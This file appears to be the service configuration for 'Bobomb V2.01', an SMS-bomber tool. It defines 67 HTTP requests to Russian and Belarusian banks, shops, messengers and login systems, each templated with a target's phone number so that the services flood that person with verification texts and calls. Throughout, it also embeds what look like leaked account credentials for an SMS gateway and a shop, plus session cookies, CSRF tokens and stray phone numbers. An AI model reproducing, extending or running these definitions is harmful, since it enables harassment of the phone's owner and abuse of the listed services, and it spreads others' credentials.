// ==========================================
// Bobomb V2.01 Services
// Total services: 67
// ==========================================

// GazPromBank
SERVICE gazprombank:GazPromBank:7
URL https://mob.gazprombank.ru/api/v2/sms/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "+7{phone}", "purpose": "registration"}
END

// YamiYami
SERVICE yamiyami:YamiYami:7
URL https://api.new.yamiyami.ru/auth/register
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
HEADER api-agent: yamiyami
BODY {"phone": "+7{phone}"}
END

// ViledKZ
SERVICE viledkz:ViledKZ:77
URL https://api-prod.viled.kz/tizilimer/api/v1/users/sms
METHOD GET
CONTENT_TYPE params
HEADER accept: */*
HEADER accept-language: ru
PARAM phone=+7{phone}
END

// EccoRU
SERVICE eccoru:EccoRU:7
URL https://ecco.ru/ajax/ajax.php
METHOD POST
CONTENT_TYPE form
HEADER Content-Type: application/x-www-form-urlencoded
DATA ajax_event=set_auth_type
DATA auth_type=phone
DATA phone_login=+7{phone}
END

// OnlineDoctor
SERVICE onlinedoctor:OnlineDoctor:7
URL https://onlinedoctor.ru/mobile/send_sms_code/
METHOD POST
CONTENT_TYPE form
HEADER Content-Type: application/x-www-form-urlencoded
DATA phone=+7{phone}
END

// ValtaRU
SERVICE valtaru:ValtaRU:7
URL https://valta.ru/bitrix/services/main/ajax.php
METHOD POST
CONTENT_TYPE form
HEADER Content-Type: application/x-www-form-urlencoded
HEADER bx-ajax: true
DATA phone=+7{phone}
END

// ErckRU
SERVICE erckru:ErckRU:7
URL https://erck.ru/ajax/sms_code.php
METHOD GET
CONTENT_TYPE params
HEADER Accept: */*
PARAM action=send
PARAM phone=+7{phone}
PARAM registration=1
PARAM hh=5b4ca24d86513c145286b68f47848447
END

// RentalClub
SERVICE rentalclub:RentalClub:7
URL https://api.rental-club.ru/v2/graphql
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"operationName": "SendConfirmationCode", "variables": {"phone": "+7{phone}"}, "query": "mutation SendConfirmationCode($phone: String!) { authSendConfirmationCode(phone: $phone) { ok } }"}
END

// Winelab
SERVICE winelab:Winelab:7
URL https://www.winelab.ru/confirmation/sendByPhone
METHOD GET
CONTENT_TYPE params
PARAM number={phone_formatted}
END

// Sunlight
SERVICE sunlight:Sunlight:7
URL https://api.sunlight.net/v3/customers/authorization/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "+7{phone}", "flashcall": true}
END

// Madyart
SERVICE madyart:Madyart:7
URL https://madyart.ru/local/aut.php
METHOD POST
CONTENT_TYPE form
DATA wct_reg_phone=+7{phone}
END

// EvrazMarket
SERVICE evraz:EvrazMarket:7
URL https://spb.evraz.market/bitrix/services/main/ajax.php
METHOD POST
CONTENT_TYPE form
HEADER Content-Type: application/x-www-form-urlencoded
DATA userPhone=+7{phone}
END

// Uteka
SERVICE uteka:Uteka:7
URL https://spb.uteka.ru/rpc/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"jsonrpc": "2.0", "id": 8, "method": "auth.GetCode", "params": {"phone": "{phone}"}}
END

// Elementaree
SERVICE elementaree:Elementaree:7
URL https://api-new.elementaree.ru/graphql
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"query": "mutation{sendSmsCode(phone:\\"+7{phone}\\"){ok}}"}
END

// ADengi
SERVICE adengi:ADengi:7
URL https://adengi.ru/rest/v1/registration/code/send
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "+7{phone}"}
END

// ShoppingLive
SERVICE shoppinglive:ShoppingLive:7
URL https://www.shoppinglive.ru/phone-verification/send-code
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

// ICQ
SERVICE icq:ICQ:7
URL https://u.icq.net/api/v89/rapi/auth/sendCode
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"msisdn": "+7{phone}"}
END

// Vprok (Perekrestok)
SERVICE vprok:Vprok (Perekrestok):7
URL https://www.vprok.ru/as_send_pin
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

// AliExpress Russia
SERVICE aliexpress:AliExpress Russia:7
URL https://aliexpress.ru/aer-api/v2/bx/auth/v1/web/register/phone/init
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "+7{phone}"}
END

// Fonbet
SERVICE fonbet:Fonbet:7
URL https://clientsapi03w.bk6bba-resources.com/cps/superRegistration/createProcess
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "+7{phone}"}
END

// Aptekaru
SERVICE apteka_ru:Aptekaru:7
URL https://api.apteka.ru/Auth/Auth_Code?cityUrl=moskva
METHOD POST
CONTENT_TYPE json
HEADER Accept: */*
HEADER Accept-Encoding: gzip, deflate, br
HEADER Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
HEADER Access-Control-Request-Headers: authorization,content-type
HEADER Access-Control-Request-Method: POST
HEADER Connection: keep-alive
HEADER Host: api.apteka.ru
HEADER Origin: https://apteka.ru
HEADER Referer: https://apteka.ru/
HEADER Sec-Fetch-Dest: empty
HEADER Sec-Fetch-Mode: cors
HEADER Sec-Fetch-Site: same-site
BODY {"phone": "+7{phone}", "u": "U"}
END

// Magnit
SERVICE magnit:Magnit:7
URL https://new.moy.magnit.ru/local/ajax/login/
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
DATA ksid=ee191257-a4fe-4e39-9f0f-079c7f721eee_0
END

// Telegram
SERVICE telegram:Telegram:7
URL https://my.telegram.org/auth/send_password
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

// Mt Free
SERVICE mt_free:Mt Free:7
URL https://cabinet.wi-fi.ru/api/auth/by-sms
METHOD POST
CONTENT_TYPE form
HEADER Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
HEADER Accept-Encoding: gzip, deflate, br
HEADER Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
HEADER App-ID: cabinet
HEADER Cache-Control: no-cache
HEADER Connection: keep-alive
DATA msisdn=+7{phone}
DATA g-recaptcha-response=
END

// Totopizza
SERVICE totopizza:Totopizza:7
URL https://api.totopizza.ru/graphql
METHOD POST
CONTENT_TYPE json
BODY {"operationName": "requestPhoneCodeAuth", "query": "\\n  mutation requestPhoneCodeAuth($telephone:String!) {\\n    requestPhoneCodeAuth(telephone:$telephone)\\n  }\\n", "variables": {"telephone": "{phone}"}}
END

// Sberuslugi
SERVICE sberuslugi:Sberuslugi:7
URL https://sberuslugi.ru/api/v1/user/secret
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

// Okru
SERVICE ok_ru:Okru:7
URL https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone
METHOD POST
CONTENT_TYPE form
DATA st.r.phone=+7{phone}
END

// Beerlogapizza
SERVICE beerlogapizza:Beerlogapizza:7
URL https://smsc.ru/sys/send.php
METHOD POST
CONTENT_TYPE form
DATA login=beerlogaa@gmail.com
DATA psw=QWE780p
DATA phones=+7{phone}
DATA mes=code
DATA call=1
DATA fmt=3
END

// Tashirpizza
SERVICE tashirpizza:Tashirpizza:7
URL https://tashirpizza.ru/ajax/mindbox_register
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
DATA fio=Олег Олегов Олегович
DATA bd=
END

// My-Shop
SERVICE my_shop:My-Shop:7
URL https://my-shop.ru/cgi-bin/my_util2.pl?q=my_code_for_phone_confirmation&view_id=d51a4d42-c5e8-43ce-a24d-383a3b29f17ae821ed918
METHOD POST
CONTENT_TYPE json
BODY {"phone_code": "7", "phone": "{phone}"}
END

// Citystarwear
SERVICE citystarwear:Citystarwear:7
URL https://m.citystarwear.com/bitrix/templates/bs-base/php/includes/bs-handlers.php
METHOD POST
CONTENT_TYPE form
HEADER cookie: _ga=GA1.2.1427439092.1661873883; tmr_lvid=7f1742aab6354e49610b859181e4cd90; tmr_lvidTS=1661873883545; BX_USER_ID=5e66c0741eefeeba48abfe666e49687a; _ym_uid=1661873884168755235; _ym_d=1661873884; _tt_enable_cookie=1; _ttp=01839738-27cc-4c5b-ae4a-be99662bcaf5; I_BITRIX2_SM_bsAuthPhone=9502135308; PHPSESSID=NNGLA4WVIkGxrlj8zMwacQQ75E9g7b6R; I_BITRIX2_SM_bsSiteVersionRun=D; I_BITRIX2_SM_SALE_UID=66dde7a489d38a413233c60f5ea227bd; _gid=GA1.2.85927779.1667044483; _ym_isad=1; _ym_visorc=w; I_BITRIX2_SM_BSPopUpBnr=%7B%2296591%22%3A1667130902%7D; tmr_detect=1%7C1667044505998; cto_bundle=qQMtx19qZFFHeFglMkJRQlNMcTBIUGR4VG9Rc3pLJTJCb2FaaFFyR2hndVh1azY2elRHZ1Zrbk1wZGJFTiUyQjFWJTJCQjdWQnRRb25XTnpsaDk5RGFuYWRhN3ZVWkJ3MURwbWIzUjVGem0lMkJrQUFKd25VaTVGV3FOS0pCak5ET0hLMU0lMkJqanVTRk9uZVREeG14anF4NnMzRzk5JTJGJTJGVEI3c1dJJTJCQmNTUGp4aWJWbFFXTWozb1lzQnMlM0Q; tmr_reqNum=16
DATA hdlr=bsAuthSendCode
DATA key=DOvBhIav34535434v212SEoVINS
DATA phone={phone}
DATA pcode=7
DATA vphone={phone}
END

// Tinkoff
SERVICE tinkoff:Tinkoff:7
URL https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

// Vesnashop
SERVICE vesnashop:Vesnashop:7
URL https://vesna.shop/bitrix/components/splash/auth/ajax.php
METHOD POST
CONTENT_TYPE form
HEADER Accept: application/json, text/javascript, */*; q=0.01
HEADER Accept-Encoding: gzip, deflate, br
HEADER Accept-Language: ru,en;q=0.9
HEADER Content-Type: application/x-www-form-urlencoded; charset=UTF-8
HEADER referer: https://vesna.shop/
HEADER x-requested-with: XMLHttpRequest
DATA type=auth
DATA phone=+7{phone}
DATA vtr=
END

// Markformelle
SERVICE markformelle:Markformelle:375
URL https://markformelle.by/local/templates/markformelle/components/bitrix/system.auth.form/mf/ajax.php
METHOD POST
CONTENT_TYPE form
HEADER cookie: PHPSESSID=iUGzfSXr2o4pOFTcd5gzhZJnqUvDf4Fn; BITRIX_SM_MF2_USER_REGIONS=3280%2C%D0%9C%D0%B8%D0%BD%D1%81%D0%BA; BITRIX_SM_MF2_USER_COORDS=53.902284%2C27.561831; BITRIX_SM_MF2_SALE_UID=90c4032cc80bc13d54658e6ea3e55ef5; scandit-device-id=aa64e69eac05a96945918b4150a89b49a1f5debf; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1669928340%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _gid=GA1.2.236219911.1669903257; tmr_lvid=e9202c8689ad8883d48355109dfffc4c; tmr_lvidTS=1669903256680; _ym_uid=1669903257950448967; _ym_d=1669903257; tmr_detect=1%7C1669903256740; _ga_HTV7DZDW4N=GS1.1.1669903256.1.0.1669903256.60.0.0; _ga=GA1.1.711413119.1669903257; _ym_isad=1; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; _ym_visorc=b; mindboxDeviceUUID=9fd516ae-7463-4062-bcad-bc1164f12df0; directCrm-session=%7B%22deviceGuid%22%3A%229fd516ae-7463-4062-bcad-bc1164f12df0%22%7D
DATA phone=+7{phone}
END

// Carte By By
SERVICE carte_by_by:Carte By By:375
URL https://carte.by/auth/
METHOD POST
CONTENT_TYPE form
DATA ajax=register
DATA login=Olegkiller229
DATA pass=CbivnE5316
DATA phone=+7{phone}
DATA code=
DATA company=0
DATA resend=1
DATA checksum=675
END

// Delivio By By
SERVICE delivio_by_by:Delivio By By:375
URL https://delivio.by/be/api/register
METHOD POST
CONTENT_TYPE json
BODY {"phone": "+7{phone}"}
END

// Marko By By
SERVICE marko_by_by:Marko By By:375
URL https://www.marko.by/ajax/registerSendConfirmCode.php
METHOD POST
CONTENT_TYPE form
HEADER cookie: PHPSESSID=OGHwyjmZ4jsyPyWfErJme3Tn75qdcDUw; BITRIX_SM_GUEST_ID=4982561; BITRIX_SM_LAST_VISIT=01.12.2022%2018%3A13%3A38; _ym_uid=1669907635980844980; _ym_d=1669907635; _ym_isad=1; tmr_lvid=f24f5d4c22daf9384c11f8912301367b; tmr_lvidTS=1669907635199; _ym_visorc=w; tmr_detect=1%7C1669907635256; _ga=GA1.2.1763832215.1669907635; _gid=GA1.2.29531158.1669907635; _gat_UA-161894876-1=1; BX_USER_ID=5e66c0741eefeeba48abfe666e49687a
HEADER x-requested-with: XMLHttpRequest
DATA form_data=first_name=&last_name=&email=&phone=+7{phone}&sms_code=&password=&password_confirm=
END

// Amihome By By
SERVICE amihome_by_by:Amihome By By:375
URL https://amihome.by/bitrix/services/main/ajax.php?action=likeit%3Apro.api.register.createcode
METHOD POST
CONTENT_TYPE form
DATA sessid=b22504d3c451b30338d0209d2958d661
DATA phone=+7{phone}
END

// Sipnetru
SERVICE sipnetru:Sipnetru:7
URL https://register2.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&callmode=1&phone={phone}
METHOD POST
CONTENT_TYPE json
END

// Bandeatosru
SERVICE bandeatosru:Bandeatosru:7
URL https://bandeatos.ru/?MODE=AJAX
METHOD POST
CONTENT_TYPE form
DATA sessid=475674332f23ec4b8c70a1394acd7a6e
DATA FORM_ID=bx_1789522556_form
DATA PHONE_NUMBER=+7{phone}
END

// Moneyman
SERVICE moneyman:Moneyman:7
URL https://msk.taxovichkof.ru/api/userSendSms
METHOD POST
CONTENT_TYPE json
BODY {"username": "+7 (950) 213-5308", "lang": "ru", "city": "msk"}
END

// Dodopizzaby By
SERVICE dodopizzaby_by:Dodopizzaby By:375
URL https://dodopizza.by/api/sendconfirmationcode
METHOD POST
CONTENT_TYPE form
DATA phoneNumber=+7{phone}
END

// Expresspizzaby By
SERVICE expresspizzaby_by:Expresspizzaby By:375
URL https://express-pizza.by/checkout.php?call=1
METHOD POST
CONTENT_TYPE form
DATA tel=+7{phone}
END

// Tokinyby By
SERVICE tokinyby_by:Tokinyby By:375
URL https://tokiny.by/?ajax=1&task=sendVerificationCode
METHOD POST
CONTENT_TYPE form
DATA raw={'tel:' '*+phone*'}
END

// Findclone
SERVICE findclone:Findclone:7
URL https://findclone.ru/register
METHOD POST
CONTENT_TYPE params
PARAM phone=+7{phone}
END

// Shop
SERVICE shop:Shop:375
URL https://shop.milavitsa.by/api/accounts/signUp
METHOD POST
CONTENT_TYPE json
BODY {"phone": "+7{phone}"}
END

// E-Zoo
SERVICE e_zoo:E-Zoo:375
URL https://e-zoo.by/local/gtools/login/
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

// Imarket
SERVICE imarket:Imarket:375
URL https://imarket.by/ajax/auth.php
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

// Bonus
SERVICE bonus:Bonus:375
URL https://bonus.sila.by/
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

// Qugo
SERVICE qugo:Qugo:7
URL https://api.qugo.ru/client/send-code
METHOD POST
CONTENT_TYPE json
BODY {"phone": "+7{phone}"}
END

// Evelux
SERVICE evelux:Evelux:7
URL https://evelux.ru/local/templates/evelux/ajax/confirm.phone.php
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

// Elmarket
SERVICE elmarket:Elmarket:375
URL https://www.elmarket.by/public/ajax/sms_reg.php
METHOD POST
CONTENT_TYPE params
PARAM phone=+7{phone}
END

// Vladimir
SERVICE vladimir:Vladimir:7
URL https://vladimir.holodilnik.ru/ajax/user/get_tpl.php?96.22364161776159
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

// Dostavka
SERVICE dostavka:Dostavka:7
URL https://dostavka.dixy.ru/ajax/mp-auth-test.php
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

// Tb
SERVICE tb:Tb:7
URL https://tb.tips4you.ru/auth/ajax/signup_action
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

// Vodnik
SERVICE vodnik:Vodnik:7
URL https://vodnik.ru/signin/sms-request
METHOD POST
CONTENT_TYPE json
BODY {"phone": "+7{phone}"}
END

// Clientsapi01W
SERVICE clientsapi01w:Clientsapi01W:7
URL https://clientsapi01w.bk6bba-resources.com/cps/superRegistration/createProcess
METHOD POST
CONTENT_TYPE json
BODY {"phone": "+7{phone}"}
END

// Semena-Partner
SERVICE semena_partner:Semena-Partner:7
URL https://semena-partner.ru/ajax/getPhoneCodeReg.php
METHOD POST
CONTENT_TYPE form
DATA phone=+7{phone}
END

// Ecco
SERVICE ecco:Ecco:7
URL https://ecco.ru/ajax/ajax.php
METHOD POST
CONTENT_TYPE form
HEADER Content-Type: application/x-www-form-urlencoded
HEADER accept: application/json, text/javascript, */*; q=0.01
HEADER accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7
HEADER content-type: application/x-www-form-urlencoded; charset=UTF-8
HEADER origin: https://ecco.ru
HEADER referer: https://ecco.ru/
HEADER sec-ch-ua: "Microsoft Edge";v="123", "Not:A-Brand";v="8", "Chromium";v="123"
HEADER sec-ch-ua-mobile: ?0
HEADER sec-ch-ua-platform: "Windows"
HEADER sec-fetch-dest: empty
HEADER sec-fetch-mode: cors
HEADER sec-fetch-site: same-origin
HEADER user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0
HEADER x-requested-with: XMLHttpRequest
DATA ajax_event=set_auth_type
DATA event=ajax
DATA show_description=1
DATA show_register=1
DATA auth_type=phone
DATA phone_login={phone_formatted}
END

// Onlinedoctor 1
SERVICE onlinedoctor_1:Onlinedoctor 1:7
URL https://onlinedoctor.ru/mobile/send_sms_code/
METHOD POST
CONTENT_TYPE form
HEADER Content-Type: application/x-www-form-urlencoded; charset=UTF-8
HEADER Accept: application/json, text/javascript, */*; q=0.01
HEADER Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7
HEADER Connection: keep-alive
HEADER Origin: https://onlinedoctor.ru
HEADER Referer: https://onlinedoctor.ru/doctors/
HEADER Sec-Fetch-Dest: empty
HEADER Sec-Fetch-Mode: cors
HEADER Sec-Fetch-Site: same-origin
HEADER X-CSRFToken: gsL4SrKJ2MGSWTdfqPeEvnQ_mx7suBl8x8KAwIiJzEQ
HEADER X-Requested-With: XMLHttpRequest
HEADER sec-ch-ua: "Microsoft Edge";v="123", "Not:A-Brand";v="8", "Chromium";v="123"
HEADER sec-ch-ua-mobile: ?0
HEADER sec-ch-ua-platform: "Windows"
DATA phone={full_phone}
END

// Valta
SERVICE valta:Valta:7
URL https://valta.ru/bitrix/services/main/ajax.php
METHOD POST
CONTENT_TYPE form
HEADER Content-Type: application/x-www-form-urlencoded
HEADER accept: */*
HEADER accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7
HEADER bx-ajax: true
HEADER content-type: application/x-www-form-urlencoded
HEADER origin: https://valta.ru
HEADER referer: https://valta.ru/register/current_client/person/private_zooservis/
HEADER sec-ch-ua: "Microsoft Edge";v="123", "Not:A-Brand";v="8", "Chromium";v="123"
HEADER sec-ch-ua-mobile: ?0
HEADER sec-ch-ua-platform: "Windows"
HEADER sec-fetch-dest: empty
HEADER sec-fetch-mode: cors
HEADER sec-fetch-site: same-origin
HEADER user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0
HEADER x-bitrix-csrf-token: d1f2945aeabaf10d17a4c37263504b5d
HEADER x-bitrix-site-id: s1
DATA phone={phone_formatted}
END

// BeelineTV
SERVICE BeelineTV:BeelineTV:7
URL https://rest.beeline.tv/api_v3/service/OTTUser/action/login
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json; charset=utf-8
HEADER X-Request-ID: {uuid}
BODY {"password": "{password}", "userName": "+7{phone}", "extraParams": {"loginType": {"objectType": "KalturaStringValue", "value": "singleLogin"}, "deviceDetails": {"value": "{\"family\":\"ios\",\"manufacturer\":\"Apple\",\"model\":\"iPhone 14\",\"form\":\"iPhone\",\"osversion\":\"iOS 16.1\"}", "objectType": "KalturaStringValue"}, "brandID": {"objectType": "KalturaStringValue", "value": "1"}}, "apiVersion": "5.4", "udid": "{uuid}", "partnerId": "478"}
END

// BolshoeTV
SERVICE BolshoeTV:BolshoeTV:7
URL https://api.bolshoe.tv/v1/agregator/sendAuth
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json; charset=utf-8
BODY {"auth_type":"phone","uid":"+7{phone}"}
END

// SberID Auth
SERVICE SberID_Auth:SberID Auth:7
URL https://id.sber.ru/CSAFront/oidc/sberbank_id/authorize.do
METHOD GET
CONTENT_TYPE params
HEADER Content-Type: application/x-www-form-urlencoded
PARAM redirect_uri=dgis://sidauth
PARAM scope=openid name mobile email email_confirmed
PARAM login_hint={phone}
PARAM client_id=0b9c9046-4512-41ea-ba2d-9057fac4ee52
PARAM response_type=code
PARAM authApp=SBOLWebAuthApp
PARAM app_redirect_uri=
PARAM state={random_state}
PARAM nonce={uuid}
PARAM logUid={hash:0:32}
PARAM channel=iOSMobile
PARAM personalizaton=false
END

// SberID AB
SERVICE SberID_AB:SberID AB:7
URL https://id.sber.ru/api/ab
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"platform":"web"}
END

// Parking SPB
SERVICE ParkingSPB:Parking SPB:7
URL https://parking.spb.ru/api/graphql
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json; charset=utf-8
HEADER X-APOLLO-OPERATION-NAME: verificationCodeRequest
BODY {"operationName": "verificationCodeRequest", "variables": {"params": {"action": "SIGN_IN", "subject": "{phone}", "subjectType": "PHONE"}}, "query": "mutation verificationCodeRequest($params: VerificationCodeInput!) { verificationCodeRequest(params: $params) { delay success __typename } }"}
END

// CityDrive
SERVICE CityDrive:CityDrive:7
URL https://api.citydrive.ru/signup?version=21
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json; charset=utf-8
BODY {"os": "web", "phone": "{phone}", "phone_code": "7", "vendor_id": "{uuid}"}
END
